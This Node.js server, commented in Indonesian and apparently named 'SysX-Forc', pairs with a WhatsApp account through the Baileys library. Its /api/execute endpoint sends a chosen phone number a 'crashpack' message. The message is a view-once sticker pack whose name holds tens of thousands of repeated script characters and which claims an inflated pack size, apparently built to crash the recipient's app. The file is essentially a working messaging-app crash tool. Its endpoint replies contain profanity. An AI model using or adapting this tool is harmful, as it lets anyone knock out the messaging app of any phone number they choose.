                                            if (qr) {
                
const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let sock = null;
let isConnected = false;
let pairCode = '';
let reconnectAttempts = 0;
const MAX_RECONNECT = 10;

// === STORE BUAT SESSION ===
const store = makeInMemoryStore({ 
    logger: pino({ level: 'silent' }) 
});

// === FUNGSI CRASH ===
async function crashpack(sock, jid) {
    try {
        const proto = require('@whiskeysockets/baileys').proto;
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

        const messageContent = generateWAMessageFromContent(
            jid,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        stickerPackMessage: {
                            stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                            name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                            publisher: "",
                            stickers: [
                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "BIuHVMLzx5kMva0d7V-BFo27Q6zQsJgVF3XFcVf+HP4=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "fPYWiNHg9XpGK-KNkRg8ds+ntFG9afumoaT9gtGEPZM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "aBR+ssf7vbIjBMC4pkTdKTGpDby+-IssCv+Pq9G0cV0=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "3B5N3fCByKKgVJKlID8xQS1Z+HxEBFdDUZRAxyaAoy8=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "1SHkxzMBF8JRAFx9vdZ9lywC3HHqwcIPF1ta5hQnhJM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "LRS90f31qhWdOiaEim6yOGHpUMQscTv6UrtAxerLm3c=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "XNgtQvK537PoaRdklYwCSLmak4+tCUmAOVV46Q+W5F0=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "RXhEbR5rzx1fj607pDiebPlYqCa4L1IxWuJ3KLiUQLk=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "Ty0fHlUBsdPKjVl3Nw93kZaABOOda1joRUJMCj23DKs=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "ErZgydAcXx6Cro5pF9N2j5wuCCXhgdWAQLJHM58So-0=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "lxxxDjc+kRobJpOGGMYeLkuTe7g6elcK7lVGQeEfGvE=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "di9bbDe7LWXsokpKPRWf60Ab2IzmQO5uT4Cxu-p8hbM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "bxsGaNamEq7VSUz5w77GHrDn8bze7G+E42fitTh2aMU=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "zS77ZBj9ZlWToWHHF4-DyPw9fSErdKSkYXwxBxzUa+w=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "PJAhbJd3LqZJM-MFCFsnhxQrj2UJPTEzc4-jdi+KBCk=.webp", isAnimated: false, emojis: ["🤩 🎉"] },
                                { fileName: "RVUjvO3B-xlWtHtxCj+Jl8muksvDS2rVsZplYQAm7sk=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "SXecMhGacjfeAO9RV+isEjuz7PsxxbklhRhtc8Ws5tQ=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "2oANuQSdkMD2MN9zpf7nbGrqC9dRN7aIJiPN6Z-oUKM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "7nz3gILi2QnQdqOY2gxTOlwv-rxeV6iDLWSqOys6x2U=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "C9t3SIb-puZnRCoaP7wyaYJ7XwTOxs4nK1a2qAb73-I=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "6mcrtxMTq0BPHIoVVgqdT3gP6pZi9dyhiorBFQl5ATo=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "4oZyypo1Fc8DJxPxu4UCUxw2YWXfek5Fs+lh4eUvBew=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "oKLOjMapG49YFQTkhCv-xrVXPPzaMLHSi5xB1uimac4=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "YBvO1VtCrYWqkMj7HNt79+kbQz-u2NLfmUH47Q8FM3E=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "1sPL9NC25fNGAyfbeOEQoIaMsqQpyu2S+UqsoFqe7v0=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "GJ24Wz79rkRgjiN7GYw3Fiwa8UuLIV5Ko8QEIhDjlpc=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "cjMmFaeHUCxGMw-VfaHafx8YDnDaU-xjI5o5FVoz3RI=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "d7ZA7fY10jlQADwjIFFTR3iTMMwBpwPxjouWA1Z8hgQ=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "TGm4OaC2EC90RlXmgmzzu1X18Us2meD45yZa7nHdKJg=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "vLxtzLZGDYkzJ95pqE+N-YEu2Cz-x1x58Coge-tEJq8=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "6Ex3lAHCuMoRuuDjp15c-R1jX0lq9OwKlDaPfsi9+PE=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "wlLq-60vRvaO11ngHKTyysMisdWzfVwaTbxFOfmzBIM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "3KmUDiU3r78cKXBrOstZa0bSxKYA+skw9kyZwgm11io=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "nLzMLWdRKx4jNCubzzB-WaJP3nAhGxbJOLc4dsy7dmU=.webp", isAnimated: false, emojis: ["🤩 🎉"] },
                                { fileName: "XYZUdb2UGBdNuv8NjmN7jDkRsTNot53I+xt-DGgLg00=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "XNs9t4SIvxQ94OxbD5hd1vFt0CDMIUqG0QdyJ9BtyME=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "vt4GfKxPZ6fg1HRNgzRQCZUH4Y-T718C1gWWk0zMNKM=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "LJY4vR5atkdgCeSS1Kcm6B+skPj+IXZJh4xZI4ZRBO4=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "FQH4BTgMR7-+wWpkJVLo2MC0Ik7dSLN7Dq9gAU6qKqs=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "0Pw7-ZXjWnjZ4l9pj0cQkardn9yfso3O1RQcIvUeg14=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "iCPFgiRSHopvvBz-js3uRA7JiUBbrn7cBn-1bWE3qns=.webp", isAnimated: false, emojis: ["😋 😎 🤣 😂 😁"] },
                                { fileName: "XAWnA5EleA3Y5r8dn+OgIrcyUBR3fYqbWx4jCA7MxJk=.webp", isAnimated: false, emojis: [""] },
                                { fileName: "PY9o9fkPmUxtCe9+8N39zwSbfZ-Jj0RcjAvW2JP31io=.webp", isAnimated: false, emojis: [""] }
                            ],
                            fileLength: "8020935",
                            fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                            fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                            mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                            directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "",
                            mediaKeyTimestamp: "1749506440",
                            trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11293192_987589920117341_7624412198674010830_n.enc?ccb=11-4&oh=01_Q5Aa1wEsjICRK3G8YjlWAC0VhEhMrjAbUBenZphNNmjDSSXM7w&oe=686ED116&_nc_sid=5e03e0",
                            thumbnailSha256: "UOcoPZ0vEtKCLWiY4LjSjJXqBd93qjCI9cUXo70CCtY=",
                            thumbnailEncSha256: "A+BTqfSW5Cnt+tUwAHHcGPuppnk49pB72O3iz9jPeWg=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ZGNiZTY2OWU1NDI1YzBjMmE0Y2ExODQ1Nzc5OWM3MGJlNDZmMzgzYTlhNDg1YzdhNDdjNTBlODI0YTc1YTVjZQ==",
                            stickerPackSize: "15000000000",
                            stickerPackOrigin: "USER_CREATED"
                        }
                    }
                }
            }),
            { userJid: jid }
        );

        await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
        return { success: true };
    } catch (error) {
        console.error('🔥 CRASH ERROR:', error.message);
        return { success: false, error: error.message };
    }
}

// === CONNECT WA DENGAN RETRY LOGIC ===
async function connectWA() {
    try {
        console.log('🔄 Connecting to WhatsApp...');
        
        // Hapus auth_info kalo corrupt
        if (fs.existsSync('auth_info')) {
            try {
                // Cek apakah file creds.json ada dan valid
                const credsPath = path.join('auth_info', 'creds.json');
                if (fs.existsSync(credsPath)) {
                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
                    if (!creds.me || !creds.me.id) {
                        console.log('⚠️ Auth corrupt, deleting...');
                        fs.rmSync('auth_info', { recursive: true, force: true });
                    }
                }
            } catch (e) {
                console.log('⚠️ Auth error, deleting...');
                fs.rmSync('auth_info', { recursive: true, force: true });
            }
        }

        const { state, saveCreds } = await useMultiFileAuthState('auth_info');
        
        sock = makeWASocket({
            version: [2, 3000, 1015901307],
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['SysX-Forc', 'Chrome', '120.0.0.0'],
            syncFullHistory: false,
            markOnlineOnConnect: false,
            connectTimeoutMs: 30000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 10000
        });

        store.bind(sock.ev);

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                console.log('📱 QR CODE GENERATED (scan pake WA)');
            }

            if (connection === 'open') {
                isConnected = true;
                reconnectAttempts = 0;
                console.log('✅ CONNECTED TO WHATSAPP!');
            }

            if (connection === 'close') {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
                
                if (shouldReconnect && reconnectAttempts < MAX_RECONNECT) {
                    reconnectAttempts++;
                    console.log(`🔁 RECONNECTING... (${reconnectAttempts}/${MAX_RECONNECT})`);
                    const delay = Math.min(5000 * reconnectAttempts, 30000);
                    setTimeout(connectWA, delay);
                } else if (statusCode === DisconnectReason.loggedOut) {
                    console.log('🚫 LOGGED OUT, hapus auth_info dan restart');
                    if (fs.existsSync('auth_info')) {
                        fs.rmSync('auth_info', { recursive: true, force: true });
                    }
                } else {
                    console.log('💀 MAX RECONNECT ATTEMPTS, giving up...');
                }
            }
        });

        sock.ev.on('pairing-code', (code) => {
            pairCode = code;
            console.log(`📱 PAIR CODE: ${code}`);
        });

        return sock;
    } catch (error) {
        console.error('🔥 CONNECT ERROR:', error.message);
        if (reconnectAttempts < MAX_RECONNECT) {
            reconnectAttempts++;
            setTimeout(connectWA, 5000 * reconnectAttempts);
        }
        return null;
    }
}

// === API ENDPOINTS ===
app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === process.env.PASSWORD) {
        res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
    } else {
        res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
    }
});

app.get('/api/status', (req, res) => {
    res.json({ 
        connected: isConnected, 
        pairCode: pairCode || null,
        reconnectAttempts: reconnectAttempts
    });
});

app.post('/api/pair', async (req, res) => {
    try {
        const { number } = req.body;
        if (!number) {
            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
        }
        
        if (!sock) {
            await connectWA();
        }
        
        // Tunggu sampe sock siap
        let attempts = 0;
        while (!sock && attempts < 10) {
            await new Promise(r => setTimeout(r, 1000));
            attempts++;
        }
        
        if (!sock) {
            return res.status(500).json({ success: false, error: 'Gagal inisialisasi socket' });
        }
        
        const code = await sock.requestPairingCode(number);
        pairCode = code;
        res.json({ success: true, pairCode: code });
    } catch (error) {
        console.error('🔥 PAIR ERROR:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/execute', async (req, res) => {
    try {
        const { target } = req.body;
        if (!target) {
            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
        }
        
        if (!sock || !isConnected) {
            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
        }
        
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const result = await crashpack(sock, jid);
        
        if (result.success) {
            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
        } else {
            res.status(500).json({ success: false, error: result.error });
        }
    } catch (error) {
        console.error('🔥 EXECUTE ERROR:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/logout', async (req, res) => {
    try {
        if (sock) {
            await sock.logout();
        }
        isConnected = false;
        sock = null;
        pairCode = '';
        if (fs.existsSync('auth_info')) {
            fs.rmSync('auth_info', { recursive: true, force: true });
        }
        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// === START ===
console.log('🔥 SYSX-FORC STARTING...');
connectWA();

app.listen(PORT, () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    console.log(`👿 URL: https://${process.env.RAILWAY_STATIC_URL || 'localhost'}`);
});
